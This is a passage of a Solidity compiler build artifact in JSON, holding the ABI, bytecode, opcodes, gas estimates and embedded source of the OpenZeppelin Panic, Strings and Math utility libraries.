storage\"},\"UNDER_OVERFLOW\":{\"details\":\"arithmetic underflow or overflow\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Panic.sol\":\"Panic\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Panic.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Helper library for emitting standardized panic codes.\\n *\\n * ```solidity\\n * contract Example {\\n *      using Panic for uint256;\\n *\\n *      // Use any of the declared internal constants\\n *      function foo() { Panic.GENERIC.panic(); }\\n *\\n *      // Alternatively\\n *      function foo() { Panic.panic(Panic.GENERIC); }\\n * }\\n * ```\\n *\\n * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\\n *\\n * _Available since v5.1._\\n */\\n// slither-disable-next-line unused-state\\nlibrary Panic {\\n    /// @dev generic / unspecified error\\n    uint256 internal constant GENERIC = 0x00;\\n    /// @dev used by the assert() builtin\\n    uint256 internal constant ASSERT = 0x01;\\n    /// @dev arithmetic underflow or overflow\\n    uint256 internal constant UNDER_OVERFLOW = 0x11;\\n    /// @dev division or modulo by zero\\n    uint256 internal constant DIVISION_BY_ZERO = 0x12;\\n    /// @dev enum conversion error\\n    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;\\n    /// @dev invalid encoding in storage\\n    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;\\n    /// @dev empty array pop\\n    uint256 internal constant EMPTY_ARRAY_POP = 0x31;\\n    /// @dev array out of bounds access\\n    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;\\n    /// @dev resource error (too large allocation or too large array)\\n    uint256 internal constant RESOURCE_ERROR = 0x41;\\n    /// @dev calling invalid internal function\\n    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;\\n\\n    /// @dev Reverts with a panic code. Recommended to use with\\n    /// the internal constants with predefined codes.\\n    function panic(uint256 code) internal pure {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, 0x4e487b71)\\n            mstore(0x20, code)\\n            revert(0x1c, 0x24)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf7fe324703a64fc51702311dc51562d5cb1497734f074e4f483bfb6717572d7a\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Strings.sol":{"Strings":{"abi":[{"inputs":[{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"length","type":"uint256"}],"name":"StringsInsufficientHexLength","type":"error"},{"inputs":[],"name":"StringsInvalidAddressFormat","type":"error"},{"inputs":[],"name":"StringsInvalidChar","type":"error"}],"devdoc":{"details":"String operations.","errors":{"StringsInsufficientHexLength(uint256,uint256)":[{"details":"The `value` string doesn't fit in the specified `length`."}],"StringsInvalidAddressFormat()":[{"details":"The string being parsed is not a properly formatted address."}],"StringsInvalidChar()":[{"details":"The string being parsed contains characters that are not in scope of the given base."}]},"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212203a1af1abb0b4cf5744ff898521bbad403d92e34c815b9c80108039b2acedcc3b64736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASPRICE BYTE CALL 0xAB 0xB0 0xB4 0xCF JUMPI PREVRANDAO SELFDESTRUCT DUP10 DUP6 0x21 0xBB 0xAD BLOCKHASH RETURNDATASIZE SWAP3 0xE3 0x4C DUP2 JUMPDEST SWAP13 DUP1 LT DUP1 CODECOPY 0xB2 0xAC 0xED 0xCC EXTCODESIZE PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"297:18982:3:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea26469706673582212203a1af1abb0b4cf5744ff898521bbad403d92e34c815b9c80108039b2acedcc3b64736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASPRICE BYTE CALL 0xAB 0xB0 0xB4 0xCF JUMPI PREVRANDAO SELFDESTRUCT DUP10 DUP6 0x21 0xBB 0xAD BLOCKHASH RETURNDATASIZE SWAP3 0xE3 0x4C DUP2 JUMPDEST SWAP13 DUP1 LT DUP1 CODECOPY 0xB2 0xAC 0xED 0xCC EXTCODESIZE PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"297:18982:3:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"_tryParseChr(bytes1)":"infinite","_tryParseHexUintUncheckedBounds(string memory,uint256,uint256)":"infinite","_tryParseIntUncheckedBounds(string memory,uint256,uint256)":"infinite","_tryParseUintUncheckedBounds(string memory,uint256,uint256)":"infinite","_unsafeReadBytesOffset(bytes memory,uint256)":"infinite","equal(string memory,string memory)":"infinite","escapeJSON(string memory)":"infinite","parseAddress(string memory)":"infinite","parseAddress(string memory,uint256,uint256)":"infinite","parseHexUint(string memory)":"infinite","parseHexUint(string memory,uint256,uint256)":"infinite","parseInt(string memory)":"infinite","parseInt(string memory,uint256,uint256)":"infinite","parseUint(string memory)":"infinite","parseUint(string memory,uint256,uint256)":"infinite","toChecksumHexString(address)":"infinite","toHexString(address)":"infinite","toHexString(uint256)":"infinite","toHexString(uint256,uint256)":"infinite","toString(uint256)":"infinite","toStringSigned(int256)":"infinite","tryParseAddress(string memory)":"infinite","tryParseAddress(string memory,uint256,uint256)":"infinite","tryParseHexUint(string memory)":"infinite","tryParseHexUint(string memory,uint256,uint256)":"infinite","tryParseInt(string memory)":"infinite","tryParseInt(string memory,uint256,uint256)":"infinite","tryParseUint(string memory)":"infinite","tryParseUint(string memory,uint256,uint256)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"length\",\"type\":\"uint256\"}],\"name\":\"StringsInsufficientHexLength\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"StringsInvalidAddressFormat\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"StringsInvalidChar\",\"type\":\"error\"}],\"devdoc\":{\"details\":\"String operations.\",\"errors\":{\"StringsInsufficientHexLength(uint256,uint256)\":[{\"details\":\"The `value` string doesn't fit in the specified `length`.\"}],\"StringsInvalidAddressFormat()\":[{\"details\":\"The string being parsed is not a properly formatted address.\"}],\"StringsInvalidChar()\":[{\"details\":\"The string being parsed contains characters that are not in scope of the given base.\"}]},\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Strings.sol\":\"Strings\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Panic.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Helper library for emitting standardized panic codes.\\n *\\n * ```solidity\\n * contract Example {\\n *      using Panic for uint256;\\n *\\n *      // Use any of the declared internal constants\\n *      function foo() { Panic.GENERIC.panic(); }\\n *\\n *      // Alternatively\\n *      function foo() { Panic.panic(Panic.GENERIC); }\\n * }\\n * ```\\n *\\n * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\\n *\\n * _Available since v5.1._\\n */\\n// slither-disable-next-line unused-state\\nlibrary Panic {\\n    /// @dev generic / unspecified error\\n    uint256 internal constant GENERIC = 0x00;\\n    /// @dev used by the assert() builtin\\n    uint256 internal constant ASSERT = 0x01;\\n    /// @dev arithmetic underflow or overflow\\n    uint256 internal constant UNDER_OVERFLOW = 0x11;\\n    /// @dev division or modulo by zero\\n    uint256 internal constant DIVISION_BY_ZERO = 0x12;\\n    /// @dev enum conversion error\\n    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;\\n    /// @dev invalid encoding in storage\\n    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;\\n    /// @dev empty array pop\\n    uint256 internal constant EMPTY_ARRAY_POP = 0x31;\\n    /// @dev array out of bounds access\\n    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;\\n    /// @dev resource error (too large allocation or too large array)\\n    uint256 internal constant RESOURCE_ERROR = 0x41;\\n    /// @dev calling invalid internal function\\n    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;\\n\\n    /// @dev Reverts with a panic code. Recommended to use with\\n    /// the internal constants with predefined codes.\\n    function panic(uint256 code) internal pure {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, 0x4e487b71)\\n            mstore(0x20, code)\\n            revert(0x1c, 0x24)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf7fe324703a64fc51702311dc51562d5cb1497734f074e4f483bfb6717572d7a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Math} from \\\"./math/Math.sol\\\";\\nimport {SafeCast} from \\\"./math/SafeCast.sol\\\";\\nimport {SignedMath} from \\\"./math/SignedMath.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    using SafeCast for *;\\n\\n    bytes16 private constant HEX_DIGITS = \\\"0123456789abcdef\\\";\\n    uint8 private constant ADDRESS_LENGTH = 20;\\n    uint256 private constant SPECIAL_CHARS_LOOKUP =\\n        (1 << 0x08) | // backspace\\n            (1 << 0x09) | // tab\\n            (1 << 0x0a) | // newline\\n            (1 << 0x0c) | // form feed\\n            (1 << 0x0d) | // carriage return\\n            (1 << 0x22) | // double quote\\n            (1 << 0x5c); // backslash\\n\\n    /**\\n     * @dev The `value` string doesn't fit in the specified `length`.\\n     */\\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\\n\\n    /**\\n     * @dev The string being parsed contains characters that are not in scope of the given base.\\n     */\\n    error StringsInvalidChar();\\n\\n    /**\\n     * @dev The string being parsed is not a properly formatted address.\\n     */\\n    error StringsInvalidAddressFormat();\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            assembly (\\\"memory-safe\\\") {\\n                ptr := add(add(buffer, 0x20), length)\\n            }\\n            while (true) {\\n                ptr--;\\n                assembly (\\\"memory-safe\\\") {\\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\\n     */\\n    function toStringSigned(int256 value) internal pure returns (string memory) {\\n        return string.concat(value < 0 ? \\\"-\\\" : \\\"\\\", toString(SignedMath.abs(value)));\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        uint256 localValue = value;\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = HEX_DIGITS[localValue & 0xf];\\n            localValue >>= 4;\\n        }\\n        if (localValue != 0) {\\n            revert StringsInsufficientHexLength(value, length);\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\\n     * representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its checksummed ASCII `string` hexadecimal\\n     * representation, according to EIP-55.\\n     */\\n    function toChecksumHexString(address addr) internal pure returns (string memory) {\\n        bytes memory buffer = bytes(toHexString(addr));\\n\\n        // hash the hex part of buffer (skip length + 2 bytes, length 40)\\n        uint256 hashValue;\\n        assembly (\\\"memory-safe\\\") {\\n            hashValue := shr(96, keccak256(add(buffer, 0x22), 40))\\n        }\\n\\n        for (uint256 i = 41; i > 1; --i) {\\n            // possible values for buffer[i] are 48 (0) to 57 (9) and 97 (a) to 102 (f)\\n            if (hashValue & 0xf > 7 && uint8(buffer[i]) > 96) {\\n                // case shift by xoring with 0x20\\n                buffer[i] ^= 0x20;\\n            }\\n            hashValue >>= 4;\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Returns true if the two strings are equal.\\n     */\\n    function equal(string memory a, string memory b) internal pure returns (bool) {\\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\\n    }\\n\\n    /**\\n     * @dev Parse a decimal string and returns the value as a `uint256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `[0-9]*`\\n     * - The result must fit into an `uint256` type\\n     */\\n    function parseUint(string memory input) internal pure returns (uint256) {\\n        return parseUint(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `[0-9]*`\\n     * - The result must fit into an `uint256` type\\n     */\\n    function parseUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\\n        (bool success, uint256 value) = tryParseUint(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string} that returns false if the parsing fails because of an invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseUint(string memory input) internal pure returns (bool success, uint256 value) {\\n        return _tryParseUintUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string-uint256-uint256} that returns false if the parsing fails because of an invalid\\n     * character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseUint(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, uint256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseUintUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseUintUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, uint256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        uint256 result = 0;\\n        for (uint256 i = begin; i < end; ++i) {\\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\\n            if (chr > 9) return (false, 0);\\n            result *= 10;\\n            result += chr;\\n        }\\n        return (true, result);\\n    }\\n\\n    /**\\n     * @dev Parse a decimal string and returns the value as a `int256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `[-+]?[0-9]*`\\n     * - The result must fit in an `int256` type.\\n     */\\n    function parseInt(string memory input) internal pure returns (int256) {\\n        return parseInt(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseInt-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `[-+]?[0-9]*`\\n     * - The result must fit in an `int256` type.\\n     */\\n    function parseInt(string memory input, uint256 begin, uint256 end) internal pure returns (int256) {\\n        (bool success, int256 value) = tryParseInt(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseInt-string} that returns false if the parsing fails because of an invalid character or if\\n     * the result does not fit in a `int256`.\\n     *\\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\\n     */\\n    function tryParseInt(string memory input) internal pure returns (bool success, int256 value) {\\n        return _tryParseIntUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    uint256 private constant ABS_MIN_INT256 = 2 ** 255;\\n\\n    /**\\n     * @dev Variant of {parseInt-string-uint256-uint256} that returns false if the parsing fails because of an invalid\\n     * character or if the result does not fit in a `int256`.\\n     *\\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\\n     */\\n    function tryParseInt(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, int256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseIntUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseInt-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseIntUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, int256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        // Check presence of a negative sign.\\n        bytes1 sign = begin == end ? bytes1(0) : bytes1(_unsafeReadBytesOffset(buffer, begin)); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        bool positiveSign = sign == bytes1(\\\"+\\\");\\n        bool negativeSign = sign == bytes1(\\\"-\\\");\\n        uint256 offset = (positiveSign || negativeSign).toUint();\\n\\n        (bool absSuccess, uint256 absValue) = tryParseUint(input, begin + offset, end);\\n\\n        if (absSuccess && absValue < ABS_MIN_INT256) {\\n            return (true, negativeSign ? -int256(absValue) : int256(absValue));\\n        } else if (absSuccess && negativeSign && absValue == ABS_MIN_INT256) {\\n            return (true, type(int256).min);\\n        } else return (false, 0);\\n    }\\n\\n    /**\\n     * @dev Parse a hexadecimal string (with or without \\\"0x\\\" prefix), and returns the value as a `uint256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]*`\\n     * - The result must fit in an `uint256` type.\\n     */\\n    function parseHexUint(string memory input) internal pure returns (uint256) {\\n        return parseHexUint(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]*`\\n     * - The result must fit in an `uint256` type.\\n     */\\n    function parseHexUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\\n        (bool success, uint256 value) = tryParseHexUint(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string} that returns false if the parsing fails because of an invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseHexUint(string memory input) internal pure returns (bool success, uint256 value) {\\n        return _tryParseHexUintUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string-uint256-uint256} that returns false if the parsing fails because of an\\n     * invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseHexUint(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, uint256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseHexUintUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseHexUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseHexUintUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, uint256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        // skip 0x prefix if present\\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(buffer, begin)) == bytes2(\\\"0x\\\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        uint256 offset = hasPrefix.toUint() * 2;\\n\\n        uint256 result = 0;\\n        for (uint256 i = begin + offset; i < end; ++i) {\\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\\n            if (chr > 15) return (false, 0);\\n            result *= 16;\\n            unchecked {\\n                // Multiplying by 16 is equivalent to a shift of 4 bits (with additional overflow check).\\n                // This guarantees that adding a value < 16 will not cause an overflow, hence the unchecked.\\n                result += chr;\\n            }\\n        }\\n        return (true, result);\\n    }\\n\\n    /**\\n     * @dev Parse a hexadecimal string (with or without \\\"0x\\\" prefix), and returns the value as an `address`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]{40}`\\n     */\\n    function parseAddress(string memory input) internal pure returns (address) {\\n        return parseAddress(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]{40}`\\n     */\\n    function parseAddress(string memory input, uint256 begin, uint256 end) internal pure returns (address) {\\n        (bool success, address value) = tryParseAddress(input, begin, end);\\n        if (!success) revert StringsInvalidAddressFormat();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string} that returns false if the parsing fails because the input is not a properly\\n     * formatted address. See {parseAddress-string} requirements.\\n     */\\n    function tryParseAddress(string memory input) internal pure returns (bool success, address value) {\\n        return tryParseAddress(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string-uint256-uint256} that returns false if the parsing fails because input is not a properly\\n     * formatted address. See {parseAddress-string-uint256-uint256} requirements.\\n     */\\n    function tryParseAddress(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, address value) {\\n        if (end > bytes(input).length || begin > end) return (false, address(0));\\n\\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(bytes(input), begin)) == bytes2(\\\"0x\\\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        uint256 expectedLength = 40 + hasPrefix.toUint() * 2;\\n\\n        // check that input is the correct length\\n        if (end - begin == expectedLength) {\\n            // length guarantees that this does not overflow, and value is at most type(uint160).max\\n            (bool s, uint256 v) = _tryParseHexUintUncheckedBounds(input, begin, end);\\n            return (s, address(uint160(v)));\\n        } else {\\n            return (false, address(0));\\n        }\\n    }\\n\\n    function _tryParseChr(bytes1 chr) private pure returns (uint8) {\\n        uint8 value = uint8(chr);\\n\\n        // Try to parse `chr`:\\n        // - Case 1: [0-9]\\n        // - Case 2: [a-f]\\n        // - Case 3: [A-F]\\n        // - otherwise not supported\\n        unchecked {\\n            if (value > 47 && value < 58) value -= 48;\\n            else if (value > 96 && value < 103) value -= 87;\\n            else if (value > 64 && value < 71) value -= 55;\\n            else return type(uint8).max;\\n        }\\n\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Escape special characters in JSON strings. This can be useful to prevent JSON injection in NFT metadata.\\n     *\\n     * WARNING: This function should only be used in double quoted JSON strings. Single quotes are not escaped.\\n     *\\n     * NOTE: This function escapes all unicode characters, and not just the ones in ranges defined in section 2.5 of\\n     * RFC-4627 (U+0000 to U+001F, U+0022 and U+005C). ECMAScript's `JSON.parse` does recover escaped unicode\\n     * characters that are not in this range, but other tooling may provide different results.\\n     */\\n    function escapeJSON(string memory input) internal pure returns (string memory) {\\n        bytes memory buffer = bytes(input);\\n        bytes memory output = new bytes(2 * buffer.length); // worst case scenario\\n        uint256 outputLength = 0;\\n\\n        for (uint256 i; i < buffer.length; ++i) {\\n            bytes1 char = bytes1(_unsafeReadBytesOffset(buffer, i));\\n            if (((SPECIAL_CHARS_LOOKUP & (1 << uint8(char))) != 0)) {\\n                output[outputLength++] = \\\"\\\\\\\\\\\";\\n                if (char == 0x08) output[outputLength++] = \\\"b\\\";\\n                else if (char == 0x09) output[outputLength++] = \\\"t\\\";\\n                else if (char == 0x0a) output[outputLength++] = \\\"n\\\";\\n                else if (char == 0x0c) output[outputLength++] = \\\"f\\\";\\n                else if (char == 0x0d) output[outputLength++] = \\\"r\\\";\\n                else if (char == 0x5c) output[outputLength++] = \\\"\\\\\\\\\\\";\\n                else if (char == 0x22) {\\n                    // solhint-disable-next-line quotes\\n                    output[outputLength++] = '\\\"';\\n                }\\n            } else {\\n                output[outputLength++] = char;\\n            }\\n        }\\n        // write the actual length and deallocate unused memory\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(output, outputLength)\\n            mstore(0x40, add(output, shl(5, shr(5, add(outputLength, 63)))))\\n        }\\n\\n        return string(output);\\n    }\\n\\n    /**\\n     * @dev Reads a bytes32 from a bytes array without bounds checking.\\n     *\\n     * NOTE: making this function internal would mean it could be used with memory unsafe offset, and marking the\\n     * assembly block as such would prevent some optimizations.\\n     */\\n    function _unsafeReadBytesOffset(bytes memory buffer, uint256 offset) private pure returns (bytes32 value) {\\n        // This is not memory safe in the general case, but all calls to this private function are within bounds.\\n        assembly (\\\"memory-safe\\\") {\\n            value := mload(add(add(buffer, 0x20), offset))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xad148d59f05165f9217d0a9e1ac8f772abb02ea6aaad8a756315c532bf79f9f4\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Panic} from \\\"../Panic.sol\\\";\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Floor, // Toward negative infinity\\n        Ceil, // Toward positive infinity\\n        Trunc, // Toward zero\\n        Expand // Away from zero\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit addition of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that sum = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function add512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        assembly (\\\"memory-safe\\\") {\\n            low := add(a, b)\\n            high := lt(low, a)\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit multiplication of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function mul512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        // 512-bit multiply [high low] = x * y. Compute the product mod 2\\u00b2\\u2075\\u2076 and mod 2\\u00b2\\u2075\\u2076 - 1, then use\\n        // the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n        // variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n        assembly (\\\"memory-safe\\\") {\\n            let mm := mulmod(a, b, not(0))\\n            low := mul(a, b)\\n            high := sub(sub(mm, low), lt(mm, low))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a + b;\\n            success = c >= a;\\n            result = c 